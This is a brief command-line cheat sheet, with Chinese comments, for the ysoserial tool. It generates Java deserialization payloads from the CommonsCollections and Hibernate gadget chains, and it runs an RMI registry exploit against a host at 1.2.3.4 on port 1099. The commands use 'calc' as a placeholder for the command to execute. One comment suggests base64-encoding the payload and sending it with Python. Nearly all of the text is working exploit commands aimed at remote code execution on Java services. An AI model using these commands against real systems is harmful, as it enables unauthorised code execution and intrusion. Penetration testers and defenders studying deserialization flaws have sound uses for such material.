```bash
java -jar ysoserial-all.jar CommonsCollections3 "calc" > cc3.txt

java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 1.2.3.4 1099 CommonsCollections1 "calc.exe"


# 示例: hibernate-core-5.4.6.Final.jar这个包，利用ysoserial生成payload，执行以下命令
java -Dhibernate5 -cp hibernate-core-5.4.6.Final.jar;ysoserial.jar ysoserial.GeneratePayload Hibernate1 calc.exe > token.bin
## 可能需要 base64转码再转码用python发.
```